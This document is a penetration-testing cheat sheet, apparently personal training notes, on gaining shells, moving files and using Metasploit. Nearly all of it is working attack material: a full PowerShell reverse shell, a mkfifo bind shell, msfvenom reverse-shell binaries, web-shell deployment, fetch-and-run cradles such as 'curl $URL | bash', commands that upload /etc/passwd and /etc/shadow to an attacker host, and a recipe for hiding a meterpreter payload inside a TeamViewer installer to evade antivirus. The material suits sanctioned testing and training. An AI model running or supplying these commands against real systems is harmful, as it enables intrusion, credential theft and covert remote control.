# 05 - Shells, Transfers & Metasploit
`$TARGET`=victim · `$LHOST`=attacker/listener IP · `$LPORT` · `$USER`/`$PASS` · `$FILE` · `$URL` · `$B64`=base64 blob.
## No inbound to the target — reverse shell
**IF** the victim can make outbound connections but inbound is filtered (or you want to blend in) →
- [ ] Start the listener FIRST, then fire a reverse-shell one-liner back to `$LHOST` (443 blends with HTTPS).
```bash
nc -nvlp $LPORT
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
WHY: an outbound-only connection rides egress-friendly ports and is commonly overlooked by admins.
- [ ] works → upgrade to a TTY ("Dumb shell, no job control").
- [ ] fails → listener wasn't up before the payload → port 443 → PayloadsAllTheThings generator / Antak from a web shell.
- [ ] ⏱ listener MUST be up before the payload fires, every time.
→ [[6. Shells and Payloads/2. Reverse Shells|src]]
## Inbound open to the target, outbound blocked — bind shell
**IF** you can reach the target's port but it cannot call back →
- [ ] Start a listener on the TARGET, then connect from the attack host.
```bash
nc -nvlp $LPORT
nc -nv $TARGET $LPORT
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l $TARGET $LPORT > /tmp/f
```
WHY: a bind shell makes the victim listen, so YOU initiate the traffic.
- [ ] works → connect with `nc -nv $TARGET $LPORT`, then upgrade the TTY.
- [ ] fails → plain `nc -nvlp` is NOT a real shell (text-only pipe) → use the `mkfifo` one-liner → if inbound is blocked, switch to a reverse shell.
- [ ] ⏱ inbound to the victim is usually firewalled — try reverse first.
→ [[6. Shells and Payloads/1. Bind Shells|src]]
## Need a standalone binary — msfvenom (staged vs stageless)
**IF** you need a self-delivering binary (elf/exe) rather than a one-liner →
- [ ] Generate it, then start a listener before delivery.
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > $FILE
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > $FILE
nc -nvlp $LPORT
```
WHY: the payload NAME encodes staging — `reverse_tcp` = stageless; `reverse/tcp` (slash) = staged (stager + stage).
- [ ] works → deliver it (transfer table) then catch the shell.
- [ ] fails → encode with `-e x86/shikata_ga_nai` → auto-build + deliver via Metasploit instead.
- [ ] ⏱ listener up first; pick 443 to blend with HTTPS.
→ [[6. Shells and Payloads/4. Crafting Payloads with MSFvenom|src]]
## Web server reachable — web shell → reverse
**IF** you can upload files, a web app has default creds, or you need HTTP command execution →
- [ ] Drop a language-matched web shell, then pivot to a reverse shell.
```bash
/usr/share/nishang/Antak-WebShell
```
WHY: an ASPX/Nishang shell gives a PowerShell-like interface on Windows; a PHP shell executes on Linux.
- [ ] works → from Antak run the PowerShell reverse-shell one-liner (above).
- [ ] fails → Laudanum `/usr/share/laudanum/aspx/shell.aspx` (set `allowed ips`) → bypass upload filters by changing the POST `Content-type` from `application/x-php` to `image/gif` in Burp.
- [ ] ⏱ after a foothold, DELETE the payload and log its name/hash/upload path (sha1sum/MD5) for the report.
→ [[6. Shells and Payloads/8. Web Shells|src]]
## Dumb shell, no job control — upgrade to a TTY
**IF** you have a non-interactive shell and need `sudo` prompts / job control →
- [ ] Reach a full `/bin/sh` through any interpreter present, and check sudo rights.
```bash
/bin/sh -i
perl -e 'exec "/bin/sh";'
ruby: exec "/bin/sh"
awk 'BEGIN {system("/bin/sh")}'
vim -c ':!/bin/sh'
find . -exec /bin/sh \; -quit
sudo -l
```
WHY: one of these interpreters is usually reachable from a restricted shell; `sudo -l` often reveals direct privesc.
- [ ] works → act on the rights `sudo -l` shows.
- [ ] fails → cycle bash → perl → ruby → lua → awk → find → vim until one exists → GTFOBins / Linux privesc.
- [ ] ⏱ only works if the binary exists; stop after the list is exhausted.
→ [[6. Shells and Payloads/7. Spawning Interactive Shells|src]]
## Infiltrating Windows — pick a payload type
**IF** you fingerprinted a Windows host (ICMP TTL typically 32 or 128) →
- [ ] Choose a Windows-executable payload type and a delivery/exec method.
```bash
msiexec
```
WHY: MSI runs via `msiexec`; DLL/Batch/VBS go through their loaders; PowerShell runs directly — more formats = more delivery options.
- [ ] works → deliver via an SMB share (`C$`/`admin$`), Impacket (psexec/smbclient/wmi), or FTP/TFTP/HTTP-S.
- [ ] fails → generate with `msfvenom` and transfer with a Windows method → PayloadsAllTheThings, Mythic C2, Nishang, Darkarmour.
- [ ] ⏱ confirm the OS fingerprint with TTL before committing to an exe.
→ [[6. Shells and Payloads/5. Infiltrating windows|src]]
## Infiltrating Linux
**IF** you need to infiltrate a Unix/Linux host →
- [ ] GAP: no command-level technique captured — the source note only says "usual stuff.. just using metasploit to pop a shell..".
- [ ] works → generate a Linux ELF payload with msfvenom and deliver via a Linux transfer method.
- [ ] fails → GAP: no command in the note — use §"Need a standalone binary — msfvenom" then §"Linux transfers" above; never fabricate tooling.
- [ ] ⏱ treat this as covered by msfvenom + Linux transfers; skip the note.
→ [[6. Shells and Payloads/6. Infiltrating Unix or Linux|src]]
## "I need to move $FILE from A to B" — transfer decision table

| From → To | When | Exact command |
|---|---|---|
| Attacker → Windows | HTTP/HTTPS out allowed | `(New-Object Net.WebClient).DownloadFile('$URL','$FILE')` |
| Attacker → Windows | fileless (memory only) | `IEX (New-Object Net.WebClient).DownloadString('$URL')` |
| Attacker → Windows | PS 3.0+ | `Invoke-WebRequest $URL -OutFile $FILE` |
| Attacker → Windows | SMB/445 allowed | `sudo impacket-smbserver share -smb2support /tmp/smbshare` then `copy \\$LHOST\share\$FILE` |
| Attacker → Windows | FTP + WebClient | `sudo python3 -m pyftpdlib --port 21` then `(New-Object Net.WebClient).DownloadFile('ftp://$LHOST/$FILE', 'C:\Users\Public\ftp-$FILE')` |
| Windows → Attacker | HTTP upload server | `python3 -m uploadserver` then `Invoke-FileUpload -Uri http://$LHOST:$LPORT/upload -File $FILE` |
| Windows → Attacker | SMB/445 blocked (SMB over HTTP) | `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous` then `copy $FILE \\$LHOST\DavWWWRoot\` |
| Windows → Attacker | SMB/HTTP blocked, RDP open | `xfreerdp /v:$TARGET /u:$USER /p:'$PASS' /drive:loot,$HOME/lab` then `copy $FILE \\tsclient\loot\` |
| Attacker → Linux | wget to disk | `wget $URL -O /tmp/$FILE` |
| Attacker → Linux | curl fileless | `curl $URL | bash` |
| Attacker → Linux | no client tools | `exec 3<>/dev/tcp/$TARGET/80` then `echo -e "GET /$FILE HTTP/1.1\n\n">&3` then `cat <&3` |
| Linux → Attacker | HTTPS upload | `curl -X POST https://$LHOST/upload -F 'files=@/etc/passwd' --insecure` |
| Linux → Attacker | SCP | `scp /etc/passwd $USER@$LHOST:/home/$USER/` |
| Either (both reach each other) | raw TCP pipe | `nc -q 0 $TARGET $LPORT < $FILE` |
| Anywhere | NO network path | `cat $FILE | base64 -w 0;echo` then `[IO.File]::WriteAllBytes("C:\Users\Public\$FILE", [Convert]::FromBase64String("$B64"))` |
| Anywhere | no external tools | `certutil.exe -verifyctl -split -f http://$LHOST:8000/$FILE` |
| Anywhere | only HTTP allowed (catch) | `curl -T $FILE http://localhost:9001/SecretUploadDirectory/users.txt` |
→ no row matches → base64 in-band (above) is the universal fallback · ⏱ <5 min to pick a channel. Sources: [[5. File Transfers/1. Windows File Transfer Methods|src]] · [[5. File Transfers/2. Linux File Transfer Methods|src]]
## Windows transfers — download, upload, SMB/FTP/WebDAV
**IF** you have command access on Windows and need a file down or exfil'd up →
- [ ] Use PowerShell cradles for HTTP; SMB/FTP/WebDAV when HTTP is filtered; an upload receiver for exfil.
```bash
(New-Object Net.WebClient).DownloadFile('$URL','$FILE')
Invoke-WebRequest $URL -OutFile $FILE
sudo impacket-smbserver share -smb2support /tmp/smbshare
copy \\$LHOST\share\$FILE
Invoke-FileUpload -Uri http://$LHOST:$LPORT/upload -File $FILE
```
WHY: HTTP/HTTPS is the most commonly allowed outbound path; SMB is native; PowerShell has no built-in upload so build it.
- [ ] works → execute the payload / verify the hash on the received file.
- [ ] fails → SMB "block unauthenticated guest access": `sudo impacket-smbserver share -smb2support /tmp/smbshare -user $USER -password $PASS` then `net use n: \\$LHOST\share /user:$USER $PASS` → else WebDAV (`wsgidav` then `copy $FILE \\$LHOST\DavWWWRoot\`).
- [ ] ⏱ IWR error "IE engine not available" → add `-UseBasicParsing`; TLS trust error → set `ServerCertificateValidationCallback`.
→ [[5. File Transfers/1. Windows File Transfer Methods|src]]
## Linux transfers — download, upload, serve from the box
**IF** you have command execution on Linux and need files in or out →
`wget`/`curl` to disk or fileless; `uploadserver`/`scp` to exfil; serve from the web root.
```bash
wget $URL -O /tmp/$FILE
curl $URL | bash
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
curl -X POST https://$LHOST/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
scp /etc/passwd $USER@$LHOST:/home/$USER/
python3 -m http.server
```
WHY: wget/curl are ubiquitous; HTTPS uploadserver passes firewalls that allow only web traffic.
- [ ] works → file in place / on the attacker; verify integrity.
- [ ] fails → no client tools? use `/dev/tcp` (in the table) → enable SSH: `sudo systemctl enable ssh` then `sudo systemctl start ssh` (check `netstat -lnpt`).
- [ ] ⏱ keep the cert OUT of the web root; `--insecure` is only because the cert is self-signed.
→ [[5. File Transfers/2. Linux File Transfer Methods|src]]
## No clean protocol — Netcat/Ncat pipe & base64 in-band
**IF** both ends reach each other (raw pipe) or there is NO network path (in-band) →
- [ ] Push/pull with nc/ncat; otherwise base64 through the terminal.
```bash
ncat -l -p $LPORT --recv-only > $FILE
nc -q 0 $TARGET $LPORT < $FILE
cat $FILE | base64 -w 0;echo
[IO.File]::WriteAllBytes("C:\Users\Public\$FILE", [Convert]::FromBase64String("$B64"))
```
WHY: raw TCP works with the least tooling; base64 needs zero network — survives total egress lockdown.
- [ ] works → confirm integrity (`Get-FileHash -Algorithm MD5` on Windows, `md5sum` on the attacker).
- [ ] fails → if neither nc nor ncat exists use `/dev/tcp` → reconstruct an upload-side base64 with `echo $B64 | base64 -d -w 0 > $FILE`.
- [ ] ⏱ use `-q 0`/`--send-only`/`--recv-only` so the sender closes; 443 blends in.
→ [[5. File Transfers/4. Miscellaneous File Transfer Methods|src]] · [[5. File Transfers/1. Windows File Transfer Methods|src]]
## No external tooling allowed — living off the land (LOLBins)
**IF** you must download/upload/exec using binaries already present (allow-listing) →
- [ ] Abuse built-in signed binaries (`certreq`/`certutil`/`bitsadmin` on Windows, OpenSSL on Linux).
```bash
certreq.exe -Post -config http://$LHOST:$LPORT/ $FILE
bitsadmin /transfer wcb /priority foreground http://$LHOST:8000/$FILE C:\Users\$USER\Desktop\$FILE
certutil.exe -verifyctl -split -f http://$LHOST:8000/$FILE
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < $FILE
openssl s_client -connect $TARGET:80 -quiet > $FILE
```
WHY: trusted pre-installed binaries evade tool-based allow-listing.
- [ ] works → file delivered; run it (and clean up).
- [ ] fails → search LOLBAS (Windows) `Download`/`Upload`/`Execute` and GTFOBins (Linux) → if `certreq.exe` errors it may lack `-Post` — get an updated copy.
- [ ] ⏱ AMSI flags `certutil`; `certreq` may time out yet still deliver — check the listener.
→ [[5. File Transfers/7. Living off The Land|src]]
## Must receive files over HTTP — catch uploads (Nginx PUT)
**IF** you must ACCEPT inbound uploads over HTTP/S (most-allowed protocol) →
- [ ] Enable nginx `dav_methods PUT` and PUT files with curl.
```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
sudo systemctl restart nginx.service
curl -T $FILE http://localhost:9001/SecretUploadDirectory/users.txt
```
WHY: HTTP/S are the most commonly allowed protocols; nginx + minimal PHP won't execute uploads (unlike Apache).
- [ ] works → `sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt` to confirm.
- [ ] fails → port 80 busy? `ss -lnpt | grep 80` / `ps -ef | grep 2811` → `sudo rm /etc/nginx/sites-enabled/default` or bind another port → `tail -2 /var/log/nginx/error.log`.
- [ ] ⏱ verify directory listing is NOT enabled — don't host an executable web shell by accident.
→ [[5. File Transfers/6. Catching Files over HTTPS|src]]
## Must protect data in transit — encrypt before transfer
**IF** you must exfil sensitive data and SSH/SFTP/HTTPS are unavailable →
- [ ] Encrypt on the source, then use any raw channel.
```bash
Import-Module .\Invoke-AESEncryption.ps1
openssl enc -aes256 -iter 100000 -pbkdf2 -in $FILE -out $FILE.enc
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in $FILE.enc -out $FILE
```
WHY: OpenSSL is nearly always present on Linux and can send "nc style"; the receiver needs the key.
- [ ] works → move the `.enc` blob by any method, decrypt on the other side.
- [ ] fails → prefer an encrypted channel (SSH/SFTP/HTTPS) → OpenSSL `s_server`/`s_client` for an SSL-wrapped transfer.
- [ ] ⏱ output is `<file>.aes`/`.enc` — don't lose the key.
→ [[5. File Transfers/5. Protected File Transfers|src]]
## Transfer via WinRM / RDP (management channels)
**IF** SMB/HTTP/HTTPS are unavailable but WinRM or RDP is open →
- [ ] Copy through an existing session (PowerShell Remoting or RDP drive redirection).
```bash
Test-NetConnection -ComputerName $TARGET -Port 5985
$Session = New-PSSession -ComputerName $TARGET
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```
WHY: WinRM (5985/5986) is frequently enabled; RDP redirection needs no extra ports.
- [ ] works → file copied; continue post-exploitation.
- [ ] fails → RDP mount: `xfreerdp /v:$TARGET /d:HTB /u:$USER /p:'$PASS' /drive:linux,/home/$USER/htb/academy/filetransfer` then use `\\tsclient\`.
- [ ] ⏱ WinRM needs admin / Remote Management Users / explicit session-config permissions.
→ [[5. File Transfers/4. Miscellaneous File Transfer Methods|src]]
## Metasploit — when to use it (core workflow + auto delivery)
**IF** you want one console to enumerate, build/stage/deliver payloads, exploit, and post-exploit →
- [ ] Search/select a module, set options, run; let modules auto-build the payload when you have creds.
```bash
search type:exploit platform:windows cve:2021 rank:excellent microsoft
setg RHOSTS $TARGET
grep meterpreter show payloads
db_nmap -sV -sS $TARGET
sessions -i 1
hashdump
```
WHY: MSF is a swiss-army knife; `setg` avoids re-typing; `smb/psexec` builds, stages and delivers automatically (set `RHOSTS`/`LHOST`/`SMBUser`/`SMBPass`/`SMBDomain`, then `exploit`).
- [ ] works → `search local_exploit_suggester` for privesc → `hashdump` for local hashes.
- [ ] fails → fall back to manual: `msfvenom` payload + a transfer method → GAP: notes only, no command for the exact `msfconsole` CLI of `smb/psexec` (only module/option names were captured).
- [ ] ⏱ don't `[CTRL]+[C]` an active exploit (port stays bound) — `[CTRL]+[Z]`/`background`, then `jobs`.
→ [[7. Metasploit/1. Metasploit|src]] · [[6. Shells and Payloads/3. Automating Payloads & Delivery with Metasploit|src]]
## Metasploit — firewall & IDS/IPS evasion
**IF** signature/AV/perimeter defenses are blocking your payload →
- [ ] Embed in a legit exe (`-k`), encode (SGN), and/or password-protect a RAR.
```bash
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
rar a ~/$FILE.rar -p ~/$FILE
mv $FILE.rar $FILE
```
WHY: `-k` runs the host app while the payload runs in a separate thread; password-protected archives stop AV scanning; stripping/renesting the extension hampers kiosk AV.
- [ ] works → deliver and execute; expect the AV "could not scan password-protected file" tell.
- [ ] fails → raise `-i` iterations (SGN) → try a LOLBin delivery → else use a custom payload.
- [ ] ⏱ modern AV usually detects single-SGN payloads — packing is a bonus, not a guarantee.
→ [[7. Metasploit/2. Firewall and IDS or IPS Evasion|src]]
## Loop-back
New stage → re-enter at the matching section:

| New thing | Re-run |
|---|---|
| Got a shell (any OS) | "Dumb shell, no job control" → hunt / privesc |
| Need a payload binary | "msfvenom" → then the transfer table |
| New file to move | transfer decision table → matching method |
| Egress locked down | base64 in-band → LOLBins → catch over HTTP |
| SMB/HTTP blocked, WinRM/RDP open | "Transfer via WinRM / RDP" |
| Creds in hand for a Windows box | Metasploit `smb/psexec` auto-delivery |
| Back to creds / hashes | [[04 - Credentials & Common Services]] |
